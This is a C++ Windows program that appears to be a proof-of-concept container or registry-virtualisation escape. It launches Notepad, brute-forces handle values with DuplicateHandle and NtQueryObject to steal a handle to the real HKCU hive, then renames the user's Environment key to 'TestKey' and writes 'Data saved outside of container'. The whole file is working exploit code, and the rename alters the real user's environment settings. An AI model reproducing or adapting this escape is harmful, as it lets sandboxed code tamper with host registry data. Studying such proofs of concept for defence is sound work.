#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>
#include <sddl.h>

#include <cstdio>
#include <cstdlib>

#pragma comment(lib, "ntdll")

#define ObjectNameInformation ((OBJECT_INFORMATION_CLASS)1)

extern "C" {

LONG NTAPI RtlCompareUnicodeString(
  PCUNICODE_STRING String1,
  PCUNICODE_STRING String2,
  BOOLEAN CaseInSensitive
);

}  // extern "C"

int main() {
  BYTE NameBuffer[0x200];
  NTSTATUS Status;

  //
  // Build the \Registry\User\<SID> path for the current user.
  //

  HANDLE hToken;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
    printf("OpenProcessToken failed with error %u\n", GetLastError());
    return 1;
  }

  DWORD UserInfoLength;
  if (GetTokenInformation(hToken, TokenUser, NULL, 0, &UserInfoLength) ||
      GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    printf("GetTokenInformation failed with error %u\n", GetLastError());
    return 1;
  }

  TOKEN_USER* UserInfo = (TOKEN_USER*)malloc(UserInfoLength);

  if (!GetTokenInformation(hToken,
                           TokenUser,
                           UserInfo,
                           UserInfoLength,
                           &UserInfoLength)) {
    printf("GetTokenInformation failed with error %u\n", GetLastError());
    return 1;
  }

  LPWSTR StringSid;
  if (!ConvertSidToStringSidW(UserInfo->User.Sid, &StringSid)) {
    printf("ConvertSidToStringSidW failed with error %u\n", GetLastError());
    return 1;
  }

  CONST SIZE_T RegistryPathCharsLength = (wcslen(StringSid) + 17);
  CONST SIZE_T RegistryPathBytesLength = RegistryPathCharsLength * sizeof(WCHAR);
  PWSTR wchKeyPath = (PWSTR)malloc(RegistryPathBytesLength);

  if (wchKeyPath == NULL) {
    printf("Failed to allocate registry path buffer\n");
    return 1;
  }

  _snwprintf_s(wchKeyPath, RegistryPathCharsLength, RegistryPathCharsLength - 1,
               L"\\REGISTRY\\USER\\%s", StringSid);

  //
  // Create the Notepad process and wait for it to fully start.
  //

  STARTUPINFOW si;
  PROCESS_INFORMATION pi;

  memset(&si, 0, sizeof(si));
  memset(&pi, 0, sizeof(pi));

  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_MINIMIZE;

  BOOL bRet = CreateProcessW(L"C:\\Windows\\system32\\notepad.exe",
                             NULL,
                             NULL,
                             NULL,
                             FALSE,
                             0,
                             NULL,
                             NULL,
                             &si,
                             &pi);

  if (bRet) {
    CloseHandle(pi.hThread);
  } else {
    printf("CreateProcess failed with error %u\n", GetLastError());
    return 1;
  }

  Sleep(1000);

  //
  // Enumerate the subprocess handles in search of one that points to HKCU.
  //

  UNICODE_STRING TargetKeyPath;
  RtlInitUnicodeString(&TargetKeyPath, wchKeyPath);

  HKEY hKeyUser = NULL;
  for (ULONG Handle = 4; Handle < 0x1000; Handle += 4) {
    HANDLE DuplicatedHandle;
    bRet = DuplicateHandle(pi.hProcess,
                           (HANDLE)Handle,
                           GetCurrentProcess(),
                           &DuplicatedHandle,
                           0,
                           FALSE,
                           DUPLICATE_SAME_ACCESS);

    ULONG ReturnLength;
    Status = NtQueryObject(DuplicatedHandle,
                           ObjectNameInformation,
                           NameBuffer,
                           sizeof(NameBuffer),
                           &ReturnLength);

    if (NT_SUCCESS(Status)) {
      PUNICODE_STRING Name = (PUNICODE_STRING)NameBuffer;

      if (!RtlCompareUnicodeString(Name, &TargetKeyPath, TRUE)) {
        hKeyUser = (HKEY)DuplicatedHandle;
        break;
      }
    }

    CloseHandle(DuplicatedHandle);
  }

  if (hKeyUser == NULL) {
    printf("Failed to find HKCU\n");
    return 1;
  }

  //
  // Open the Environment key via the differencing hive.
  //

  HKEY hKeyEnvironment;
  LONG st = RegOpenKeyExW(hKeyUser,
                          L"Environment",
                          0,
                          KEY_ALL_ACCESS,
                          &hKeyEnvironment);

  if (st != ERROR_SUCCESS) {
    printf("RegOpenKeyExW failed with error %d\n", st);
    return 1;
  }

  //
  // Rename the key and set a new value.
  //

  st = RegRenameKey(hKeyEnvironment, NULL, L"TestKey");

  if (st != ERROR_SUCCESS) {
    printf("RegRenameKey failed with error %d\n", st);
    return 1;
  }

  st = RegSetValueExW(hKeyEnvironment,
                      L"Success",
                      0,
                      REG_SZ,
                      (const BYTE*)L"Data saved outside of container",
                      62);

  if (st != ERROR_SUCCESS) {
    printf("RegSetValueExW failed with error %d\n", st);
    return 1;
  }

  printf("Done, please check your HKCU\\TestKey key!\n");
  getchar();

  RegCloseKey(hKeyEnvironment);
  RegCloseKey(hKeyUser);
  TerminateProcess(pi.hProcess, 0);
  CloseHandle(pi.hProcess);

  return 0;
}
